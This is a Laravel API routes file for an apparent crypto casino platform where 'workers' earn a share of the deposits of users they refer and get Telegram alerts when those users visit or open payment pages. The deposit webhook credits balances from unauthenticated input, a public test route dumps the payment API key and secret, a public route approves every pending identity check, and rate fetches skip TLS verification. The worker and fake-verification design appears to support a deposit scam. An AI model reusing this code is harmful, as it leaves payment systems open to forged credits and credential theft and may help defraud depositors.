<?php

use App\Http\Controllers\Api\Profile\ProfileController;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Broadcast;
use Illuminate\Support\Facades\Route;
use App\Models\Panel\Domain;
use App\Models\Deposit;
use App\Models\Panel\NotifySetting;
use Illuminate\Support\Facades\Http;
use App\Services\Telegram\NewVisit;
use App\Models\Panel\SettingsWorker;
use App\Services\Telegram\NewDeposit;
use App\Models\Panel\Worker;

use App\Models\Verification;
use App\Models\User;
use App\Services\Telegram\openPayment;
use Illuminate\Support\Facades\Validator;
use App\Models\Panel\Promo;
/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "api" middleware group. Make something great!
|
*/

Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
    return $request->user();
});

Route::prefix('slots')->group(function () {
    Route::post('/gs2c_/gameService', [App\Http\Controllers\Api\Games\SlotController::class, 'handleGame']);
    Route::post('/gs2c/stats.do', [App\Http\Controllers\Api\Games\SlotController::class, 'getStats']);
});


Route::post('/slots/gs2c/stats.do', function () {
    return response()->json(["description" => "OK", "error" => 0]);
});
/*
 * Auth Route with JWT
 */
Route::group(['prefix' => 'auth', 'as' => 'auth.'], function () {
    include_once(__DIR__ . '/groups/api/auth/auth.php');
});

Route::group(['middleware' => ['auth.jwt']], function () {
    Route::prefix('profile')
        ->group(function () {
            include_once(__DIR__ . '/groups/api/profile/profile.php');
            include_once(__DIR__ . '/groups/api/profile/affiliates.php');
            include_once(__DIR__ . '/groups/api/profile/wallet.php');
            include_once(__DIR__ . '/groups/api/profile/likes.php');
            include_once(__DIR__ . '/groups/api/profile/favorites.php');
            include_once(__DIR__ . '/groups/api/profile/recents.php');
            include_once(__DIR__ . '/groups/api/profile/vip.php');
        });

    Route::prefix('wallet')
        ->group(function () {
            include_once(__DIR__ . '/groups/api/wallet/deposit.php');
            include_once(__DIR__ . '/groups/api/wallet/withdraw.php');
        });

    include_once(__DIR__ . '/groups/api/missions/mission.php');;
    include_once(__DIR__ . '/groups/api/missions/missionuser.php');;
});


Route::prefix('categories')
    ->group(function () {
        include_once(__DIR__ . '/groups/api/categories/index.php');;
    });

include_once(__DIR__ . '/groups/api/games/index.php');
include_once(__DIR__ . '/groups/api/gateways/suitpay.php');

Route::prefix('search')
    ->group(function () {
        include_once(__DIR__ . '/groups/api/search/search.php');
    });

Route::prefix('profile')
    ->group(function () {
        Route::post('/getLanguage', [ProfileController::class, 'getLanguage']);
        Route::put('/updateLanguage', [ProfileController::class, 'updateLanguage']);
    });

Route::prefix('providers')
    ->group(function () {});


Route::prefix('settings')
    ->group(function () {
        include_once(__DIR__ . '/groups/api/settings/settings.php');
        include_once(__DIR__ . '/groups/api/settings/banners.php');
        include_once(__DIR__ . '/groups/api/settings/currency.php');
        include_once(__DIR__ . '/groups/api/settings/bonus.php');
    });

// LANDING SPIN
Route::prefix('spin')
    ->group(function () {
        include_once(__DIR__ . '/groups/api/spin/index.php');
    })
    ->name('landing.spin.');

Route::prefix('chat')
    ->group(function () {
        include_once(__DIR__ . '/groups/api/chat/index.php');
    });

Route::get('domain/info', function () {
    $domain = Domain::where('domain', request()->getHost())->first();
    return response()->json($domain);
});

Route::post('westwallet/invoce', function () {
    $data = request()->all();
    try {
        $course_btc = Http::withoutVerifying()
            ->get('https://api.coindesk.com/v1/bpi/currentprice/BTC.json')
            ->json()['bpi']['USD']['rate_float'];

        $eth_response = Http::withoutVerifying()
            ->get('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd')
            ->json();

        if (!isset($eth_response['ethereum']) || !isset($eth_response['ethereum']['usd'])) {
            throw new \Exception('Invalid ETH API response structure');
        }

        $course_eth = $eth_response['ethereum']['usd'];
    } catch (\Exception $e) {
        \Log::error('Error getting crypto rates: ' . $e->getMessage());
        $course_btc = 41000; // значение по умолчанию
        $course_eth = 2200;  // значение по умолчанию
    }


    if ($data['status'] == 'completed') {
        $user = User::query()->where('id', $data['label'])->first();
        $user_wallet = $user->wallet;

        $setting = SettingsWorker::query()->first();
    
        $percent_profit_workera = ($data['amount'] * $setting->percent_profit_worker) / 100;
        Deposit::query()->create([
            'user_id' => $user->id,
            'amount' => $data['amount'],
            'type' => 'deposit',
            'currency' => $data['currency'],
            'status' => 'completed',
            'payment_id' => $data['id']
        ]);

        if ($user->inviter) {

            $inviter = Worker::query()->where('id', $user->inviter)->first();

            if ($data['currency'] == 'USDTTRC20') {
                $user_wallet->update(['balance' => $user_wallet->balance + $data['amount']]);
                $inviter->balance = $inviter->balance + $percent_profit_workera;
                $inviter->save();
            } else {

                if ($data['currency'] == 'BTC') {
                    $amount = $percent_profit_workera * $course_btc;
                    $amount_base = $data['amount'] * $course_btc;

                    $user_wallet->update(['balance' => $user_wallet->balance + $amount_base]);

                    $inviter->update(['balance' => (float)($inviter->balance + $amount)]);
                    
                } else {
                    $amount = $percent_profit_workera * $course_eth;
                    $amount_base = $data['amount'] * $course_eth;
                    $user_wallet->update(['balance' => $user_wallet->balance + $amount_base]);
                    $inviter->balance = $inviter->balance + $amount;
                    $inviter->save();
                }
            }

            $notify_settings = NotifySetting::query()->where('user_id', $inviter->id)->first();
            if ($notify_settings->notify_new_payment) {
                (new NewDeposit())->send($notify_settings->bot_token, $inviter->tg_id, $data['amount'], $data['currency'], $user->email);
            }
        }
    }


    return response()->json(['success' => true]);
});

Route::get('verification', function (Request $request) {
    try {
        $verification = Verification::query()
            ->where('user_id', auth('api')->user()->id)
            ->first();
        $user = auth('api')->user();
        $promo = Promo::query()->where('promo_code', $user->inviter_code)->first();

        return response()->json([
            'success' => true,
            'verification' => $verification,
            'min_deposit' => $promo->min_deposit_activation
        ]);
    } catch (\Exception $e) {
        return response()->json([
            'success' => false,
            'message' => 'Error fetching verification status'
        ], 500);
    }
});

Route::post('start-verification', function (Request $request) {
    try {
        $verification = Verification::query()
            ->where('user_id', auth('api')->user()->id)
            ->first();

        if (!empty($verification)) {
            return response()->json([
                'success' => false,
                'message' => 'Verification already started'
            ], 400);
        }

        $validator = Validator::make($request->all(), [
            'first_name' => 'required|string|max:255',
            'last_name' => 'required|string|max:255',
            'country' => 'required|string|max:255',
            'date_of_birth' => 'required|date|before:today',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'success' => false,
                'message' => 'Validation error',
                'errors' => $validator->errors()
            ], 422);
        }

        Verification::create([
            'user_id' => auth('api')->user()->id,
            'first_name' => $request->first_name,
            'last_name' => $request->last_name,
            'country' => $request->country,
            'date_of_birth' => $request->date_of_birth,
            'verification_status' => 'pending'
        ]);

        return response()->json([
            'success' => true,
            'message' => 'Verification started successfully'
        ], 201);
    } catch (\Exception $e) {
        return response()->json([
            'success' => false,
            'message' => 'Error starting verification'
        ], 500);
    }
});

Route::get('update-verification', function () {
    $verifications = Verification::query()
        ->where('created_at', '>=', now()->subMinutes(2))
        ->where('verification_status', 'pending')
        ->get();
    foreach ($verifications as $verification) {
        $verification->update(['verification_status' => 'approved']);
        $user = User::query()->where('id', $verification->user_id)->first();
        $user->update(['is_verification' => true]);
    }
    return response()->json(['message' => 'Verification updated']);
});


Route::get('new-visit', function () {


    if (auth('api')->check()) {
        $user = auth('api')->user();

        if ($user->inviter) {
            $worker = Worker::query()->where('id', $user->inviter)->first();

            if ($worker->notify) {
                $notify = NotifySetting::query()->where('user_id', $worker->id)->first();
                if ($notify->notify_new_visit) {

                    (new NewVisit())->send($notify->bot_token, $worker->tg_id);
                }
            }
        }
    }
    return response()->json(['success' => true]);
});


Route::get('open-payment', function () {

    if (auth('api')->check()) {
        $user = auth('api')->user();
        if ($user->inviter) {
            $worker = Worker::query()->where('id', $user->inviter)->first();
            if ($worker->notify) {
                $notify = NotifySetting::query()->where('user_id', $worker->id)->first();

                if ($notify->notify_new_order) {
                    (new openPayment())->send($notify->bot_token, $worker->tg_id);
                }
            }
        }
    }
    return response()->json(['success' => true]);
});

Route::get('test', function () {
    $coins_generate = ['USDTTRC20', 'BTC', 'ETH'];
    foreach ($coins_generate as $coin) {
        try {
            $client = new \WestWallet\WestWallet\Client(
                env('WEST_WALLET_API_KEY'),
                env('WEST_WALLET_API_SECRET')
            );

            $address = $client->generateAddress($coin, env('WEST_WALLET_WEBHOOK_URL'), '1');

            dd($address, env('WEST_WALLET_WEBHOOK_URL'), env('WEST_WALLET_API_KEY'), env('WEST_WALLET_API_SECRET'));
            sleep(1);
        } catch (\WestWallet\WestWallet\CurrencyNotFoundException $e) {
            dd($e);
        } catch (\Exception $e) {
            dd($e);
        }
    }
});
